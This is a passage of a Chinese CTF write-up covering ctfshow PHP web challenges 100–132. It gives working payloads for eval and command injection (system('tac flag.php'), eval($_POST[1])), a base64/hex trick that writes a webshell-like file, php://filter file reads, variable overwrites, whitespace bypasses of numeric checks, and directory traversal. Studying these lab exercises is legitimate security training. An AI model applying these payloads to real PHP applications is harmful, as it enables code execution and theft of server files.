首先被赋值，后进行逻辑判断</p>\n<p>故 <code>v0</code>  的值只与 <code>v1</code>  的值有关，而后面 <code>v2</code>  和 <code>v3</code>  可以任意选</p>\n<p>这里由于只有 <code>eval(&quot;$v2('ctfshow')$v3&quot;);</code></p>\n<p>故采用 <code>var_dump</code>  函数打印，</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>v1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">=</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v3<span class=\"token operator\">=</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>payload2<span class=\"token punctuation\">:</span> <span class=\"token operator\">?</span>v1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">=</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>v3<span class=\"token operator\">=</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'ctfshow.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"web-101\"><a class=\"anchor\" href=\"#web-101\">#</a> web 101</h1>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/web101.png\" alt=\"\" /></p>\n<p>改为这个</p>\n<p>利用反射机制</p>\n<p><code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</code></p>\n<h1 id=\"web-102\"><a class=\"anchor\" href=\"#web-102\">#</a> web 102</h1>\n<p>只有一种解，查看 wp 为</p>\n<p>对</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;?&#x3D;&#96;cat *&#96;;</pre></td></tr></table></figure><p>base64 编码后，删去末尾 &quot;=&quot;, 然后进行 hex 编码，可得到 <code>5044383959474e6864434171594473</code> ，恰好有 <code>e</code> ，可以用科学计数法绕过 <code>v2</code>  的数字判断，而 <code>v1</code>  可以传入 <code>hex2bin</code>  将十六进制转回 base64， <code>v3</code>  使用  <code>filter base64</code>  写入文件，</p>\n<p>payload</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>v2<span class=\"token operator\">=</span><span class=\"token number\">115044383959474e6864434171594473</span><span class=\"token operator\">&amp;</span>v3<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/convert.base64-decode/resource=web102_2.php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>v1<span class=\"token operator\">=</span>hex2bin</pre></td></tr></table></figure><h1 id=\"web-103\"><a class=\"anchor\" href=\"#web-103\">#</a> web 103</h1>\n<p>同 web 102 做法</p>\n<h1 id=\"web-104\"><a class=\"anchor\" href=\"#web-104\">#</a> web 104</h1>\n<ol>\n<li>没有判断两值相同的情况，可分别赋一样的值得到 flag</li>\n<li>由于 shal 对数组类型数据不能处理，返回 false，因此也可以用数组绕过</li>\n<li></li>\n</ol>\n<h1 id=\"web-105\"><a class=\"anchor\" href=\"#web-105\">#</a> web 105</h1>\n<p>这题主要考虑对变量重新赋值的操作</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$error</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'你还想要flag嘛？'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$suces</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'既然你想要那给你吧！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>        </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"what are you doing?!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token variable\">$$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$$value</span><span class=\"token punctuation\">;</span>                   </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>    </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>            </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"what are you doing?!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$$value</span><span class=\"token punctuation\">;</span>                  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$error</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your are good\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>   </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$suces</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>对 <code>foreach()</code>  中的参数进行研究，对于传入的 GET 值，键对应 key，内容对应 value；</p>\n<p>而之后的 <code> $$key = $$val</code> , 则是对某一变量的重新赋值 (或者创建一个变量)</p>\n<p>如 如果传入 <code>?a=flag</code> , 那么  <code>$key=a``$value=flag</code> , 那么在进行  <code>$$key = $$value</code>  语句时，即 <code> $a = $flag</code></p>\n<p>那么 flag 值就传入了变量 a 中</p>\n<p>而对于第二个处理 POST 的 <code>foreach()</code>  也是一样的</p>\n<p>重要的是在之后的 if 判断语句，当 POST 传入的 flag 不等于原来的 flag 值时，将会输出 error 的值，而对于想要获取 flag 的我们来说，flag 是未知的，也就是说这句判断一定为 true，之后的语句一定会进入，即输出 error 的值</p>\n<p>由此，根据一开始的分析，我们可以设法使 error 的值变为 flag 的值</p>\n<p>对于 post 操作，由于对内容进行了判断，因此不能使用 post 进行把 flag 赋值到 error 的操作，因此只能通过 get 操作</p>\n<p>而通过对 GET 段代码判断，发现只过滤了 error 值，因此可以把 flag 赋值到某一变量中</p>\n<p>即对 get， <code>?变量名=flag</code></p>\n<p>之后的 post，需要将 flag 值赋值到 error 中，因此对 POST <code>error=变量名</code></p>\n<p>而之后对 POST flag 的判断，由于一定为 true，故输出 error 值，即 flag</p>\n<h1 id=\"web-106\"><a class=\"anchor\" href=\"#web-106\">#</a> web 106</h1>\n<p>对于 104 的源代码增添了对传入值的相等判断，那么使用数组绕过</p>\n<h1 id=\"web-107\"><a class=\"anchor\" href=\"#web-107\">#</a> web 107</h1>\n<p><code>parse_str(string $string , array &amp;$result ): void</code></p>\n<p>如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里）。</p>\n<p>再由代码，只需传入包含 flag 赋值的 <code>v1</code> ，和 <code>MD5($v3)</code>  为传入的 flag 值</p>\n<p>payload</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>v3<span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>v1<span class=\"token operator\">=</span>flag<span class=\"token operator\">=</span>c4ca4238a0b923820dcc509a6f75849b</pre></td></tr></table></figure><h1 id=\"web-108\"><a class=\"anchor\" href=\"#web-108\">#</a> web 108</h1>\n<p>截断绕过</p>\n<p><code>?c=a%00778</code></p>\n<h1 id=\"web-109\"><a class=\"anchor\" href=\"#web-109\">#</a> web 109</h1>\n<p>关键在于 <code>eval(&quot;echo new $v1($v2());&quot;);</code></p>\n<h2 id=\"解法一\"><a class=\"anchor\" href=\"#解法一\">#</a> 解法一</h2>\n<p>这里需要补充知识</p>\n<ol>\n<li>\n<p>如果一个变量的后面跟上 ()，那么会将值作为函数进行调用</p>\n<p>如  <code>$a = 'phpinfo';$a();</code></p>\n<p>相当于进行了 <code>phpinfo();</code></p>\n</li>\n<li>\n<p>类于对象魔术方法</p>\n<p>下列方法名被认为是魔术方法： __construct () 、 __destruct () 、 __call () 、 __callStatic () 、 __get () 、 __set () 、 __isset () 、 __unset () 、 __sleep () 、 __wakeup () 、 __serialize () 、 __unserialize () 、 __toString () 、 __invoke () 、 __set_state () 、 __clone () 、 <strong>debugInfo() 。</strong></p>\n<p>__而__toString () 方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code>  应该显示些什么。</p>\n<p>如以下代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">test</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">te</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>将会输出 test</p>\n<p>这样可以采取该方法 <code>?v1=mysqli&amp;v2=system('ls')</code>  列出目录，之后 <code>?v1=mysqli&amp;v2=system('tac flag.php')</code>  读取文件</p>\n<p>或者可将 <code>mysqli</code>  换成 <code>exception</code>  类， <code>exception()</code> ，括号中的参数会将其作为 php 代码执行 (存疑，并不是这样)，不过滤</p>\n<p>因此 <code>?v1=exception&amp;v2=system('tac flag.php')</code>  也可</p>\n</li>\n</ol>\n<h2 id=\"解法二\"><a class=\"anchor\" href=\"#解法二\">#</a> 解法二</h2>\n<p>将 <code>v1</code>  改为 <code>reflectionclass</code></p>\n<p>实际上，经过尝试，对于大多数类都能这样</p>\n<p>但触发了 <code>echo new test(phpinfo());</code>  后，在之后的代码都不会执行 <mark>(具体原理不清楚)</mark></p>\n<p>大多数能够输出的原因 (猜测)：</p>\n<p>如果用 echo 输出一个类对象，那么输出结果由 <code> __toString()</code>  控制，而在高版本中， <code>__toString</code>  自动存在，其内容为 <code>print $value;</code> , 同时也可自己控制</p>\n<h1 id=\"web-110\"><a class=\"anchor\" href=\"#web-110\">#</a> web 110</h1>\n<p>过滤了各种字符，采用 <code>FilesystemIterator</code> ，参数写 <code>getcwd</code> ， <code>getcwd</code>  用来取得当前工作目录， 两个连用后返回第一个名字</p>\n<h1 id=\"web-111\"><a class=\"anchor\" href=\"#web-111\">#</a> web 111</h1>\n<p>采用超全局变量 GLOBALS，获取全局作用域下的可用的全部变量</p>\n<h1 id=\"web-112\"><a class=\"anchor\" href=\"#web-112\">#</a> web 112</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/resource=flag.php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/convert.base32-encode/resource=flag.php// 当然 base32 等其他的 base 系列都是可以的，或者其他的编码形式</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>compress<span class=\"token operator\">.</span>zlib<span class=\"token punctuation\">:</span><span class=\"token comment\">//flag.php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span></pre></td></tr></table></figure><h1 id=\"web-113\"><a class=\"anchor\" href=\"#web-113\">#</a> web 113</h1>\n<p><code>is_file()</code>  也支持一些包装器和伪协议，返回的值为 false</p>\n<h2 id=\"解法一-2\"><a class=\"anchor\" href=\"#解法一-2\">#</a> 解法一</h2>\n<p>过滤器被过滤，使用压缩流 <code>?file=compress.zlib://flag.php</code></p>\n<h2 id=\"解法二-2\"><a class=\"anchor\" href=\"#解法二-2\">#</a> 解法二</h2>\n<p>linux 里 <code>/proc/self/root</code>  是指向根目录的，也就是如果在命令行中输入 <code>ls /proc/self/root</code> ，其实显示的内容是根目录下的内容多次重复后绕过 <code>is_file</code></p>\n<p>使用脚本跑，得到 payload</p>\n<h1 id=\"web-114\"><a class=\"anchor\" href=\"#web-114\">#</a> web 114</h1>\n<p>filter</p>\n<h1 id=\"web-115\"><a class=\"anchor\" href=\"#web-115\">#</a> web 115</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">128</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$temp</span> <span class=\"token operator\">=</span> <span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>得到</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>%0C1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>%2B1</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>-1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>.1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>01</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>11</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>21</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>31</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>41</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>51</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>61</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>71</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>81</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>91</pre></td></tr></table></figure><p>对比过滤的符号，发现只有 <code>%0c</code>  可以用</p>\n<p>payload: <code>?num=%0c36</code></p>\n<h1 id=\"web-117\"><a class=\"anchor\" href=\"#web-117\">#</a> web 117</h1>\n<p>主要是要通过这些判断语句</p>\n<p><code>is_numeric($num)</code></p>\n<p><code>$num !== '36'</code></p>\n<p><code>trim($num) !== '36'</code></p>\n<p><code>filter($num) == '36') $num == '36'</code></p>\n<p><code>is_numeric()</code>  用于判断 <code>num</code>  是否为一个数字，在数字前面加上如 <code>%20</code>  的空格，那么仍为 <code>true</code> ，如果在后面加，那么为 <code>false</code></p>\n<p>第二句为不全等于，如果加了空格，因为比较的是字符串的内容，所以一定能通过</p>\n<p>第三句为 <code>trim()</code>  函数的应用</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>此函数返回字符串 str 去除首尾空白字符后的结果。如果不指定第二个参数，<span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 将去除这些字符： </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>◦ <span class=\"token string double-quoted-string\">\" \"</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">ASCII</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>，普通空格符。  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>◦ <span class=\"token string double-quoted-string\">\"\\t\"</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">ASCII</span> <span class=\"token number\">9</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x09</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>，制表符。  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>◦ <span class=\"token string double-quoted-string\">\"\\n\"</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">ASCII</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x0A</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>，换行符。  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>◦ <span class=\"token string double-quoted-string\">\"\\r\"</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">ASCII</span> <span class=\"token number\">13</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x0D</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>，回车符。  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>◦ <span class=\"token string double-quoted-string\">\"\\0\"</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">ASCII</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>，空字节符。  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>◦ <span class=\"token string double-quoted-string\">\"\\x0B\"</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">ASCII</span> <span class=\"token number\">11</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x0B</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>，垂直制表符。</pre></td></tr></table></figure><p>`</p>\n<p><code>%0c</code>  也还是可以使用，因此可以输入 <code>%0c36</code>  绕过</p>\n<p>第四句为函数 `filter 的通过，观察代码，上述能通过</p>\n<p>第五句为弱等于，由于比较的内容中有数字，因此两边都转换为数字，经过本地测试， <code>%0c36</code>  转换成了数字 36，因此也能通过判断</p>\n<p>所以 payload: <code>?num=%0c36</code></p>\n<h1 id=\"web-123\"><a class=\"anchor\" href=\"#web-123\">#</a> web 123</h1>\n<p>对于该题，看到需要 <code>POST CT_SHOW</code>  和 <code>CTF_SHOW.COM</code>  的值</p>\n<p>由于 PHP 变量只能由数字字母下划线，故如果直接上传 <code>CTF_SHOW.COM</code>  后， <code>.</code>  会自动转换成下划线，上传的实际上是 <code>CTF_SHOW_COM</code>  的变量</p>\n<p>而为了防止对后面的点进行转换，可以将 <code>CTF</code>  后的下划线改为左方括号，这样，只会将该括号改为下划线，而后面的点不受影响，但是如果将其换为 <code>.</code>  或 <code>+</code> ，两个符号均会变成下划线</p>\n<p>再看代码，之后会进行 <code>eval</code>  函数，  <code>$c</code>  为 POST 传入的 <code>$fun</code>  值</p>\n<h2 id=\"解法一-3\"><a class=\"anchor\" href=\"#解法一-3\">#</a> 解法一</h2>\n<p>传入命令 <code>extract($_POST)</code>  将变量转为 POST 类型，然后通过 POST 传入 <code>fl0g=flag_give_me</code>  绕过对 GET 变量的判断，并且满足第二个判断条件</p>\n<p>payload:  <code>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=extract($_POST)&amp;fl0g=flag_give_me</code></p>\n<h2 id=\"解法二-3\"><a class=\"anchor\" href=\"#解法二-3\">#</a> 解法二</h2>\n<p><code>get_defined_vars</code>  —— 返回由所有已定义变量所组成的数组</p>\n<p>由于返回的是数组， <code>echo</code>  输出数组只能输出 <code>Array</code> ，因此需要一个输出数组的函数或者将数组转换为字符串</p>\n<p>但输出数组的函数 <code>var_dump()</code> , <code>print_r()</code>  被禁用，故尝试使数组转换为字符串</p>\n<ul>\n<li>\n<p>implode</p>\n<p>implode —— 将一个一维数组的值转化为字符串</p>\n<p>payload: <code>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo implode(get_defined_vars())</code></p>\n</li>\n</ul>\n<h2 id=\"解法三\"><a class=\"anchor\" href=\"#解法三\">#</a> 解法三</h2>\n<p>利用 <code>argv</code>  数组</p>\n<p>数组中，用空格来进行值的分别</p>\n<p>GET: <code>?a=1+fl0g=flag_give_me</code></p>\n<p>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</code></p>\n<h2 id=\"解法四\"><a class=\"anchor\" href=\"#解法四\">#</a> 解法四</h2>\n<p>GET: <code>1=flag.php</code></p>\n<p>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1])</code></p>\n<h2 id=\"解法五\"><a class=\"anchor\" href=\"#解法五\">#</a> 解法五</h2>\n<p><code>var_dump($GLOBALS)</code></p>\n<h1 id=\"web-125\"><a class=\"anchor\" href=\"#web-125\">#</a> web 125</h1>\n<p>过滤了 <code>flag|GLOBALS|echo|var_dump|print</code></p>\n<p>仍可使用上面的法 1、法 3、法 4</p>\n<h1 id=\"web-126\"><a class=\"anchor\" href=\"#web-126\">#</a> web 126</h1>\n<p>使用法三</p>\n<h1 id=\"web-127\"><a class=\"anchor\" href=\"#web-127\">#</a> web 127</h1>\n<p>用空格绕过  <code>_</code></p>\n<p><code>?ctf show=ilove36d</code></p>\n<p><code>$_SERVER [QUERY_STRING]</code> ，经过验证，不能显示 post 传参的内容，故只能采取 get 传参</p>\n<h1 id=\"web-128\"><a class=\"anchor\" href=\"#web-128\">#</a> web 128</h1>\n<p>主要使用 <code>gettext</code>  函数</p>\n<p>获取当前信息，可以获取到参数中的值，而它又可以使用 <code>_</code> 代替该函数</p>\n<p>所以 payload: <code>?f1=_&amp;f2=get_defined_vars</code></p>\n<h1 id=\"web-129\"><a class=\"anchor\" href=\"#web-129\">#</a> web 129</h1>\n<p>目录穿越</p>\n<p><code>../ctfshow/../html/flag.php</code>  （或其他)</p>\n<h1 id=\"web-130\"><a class=\"anchor\" href=\"#web-130\">#</a> web 130</h1>\n<p><code>f=ctfshow</code></p>\n<p>或数组绕过</p>\n<p><code>f[]=1</code></p>\n<h1 id=\"web-131\"><a class=\"anchor\" href=\"#web-131\">#</a> web 131</h1>\n<p><code>$a = str_repeat(&quot;show&quot;,250000); $b = $a . &quot;36Dctfshow&quot;; echo $b;</code></p>\n<p>长度限制，绕过正则</p>\n<h1 id=\"web-132\"><a class=\"anchor\" href=\"#web-132\">#</a> web 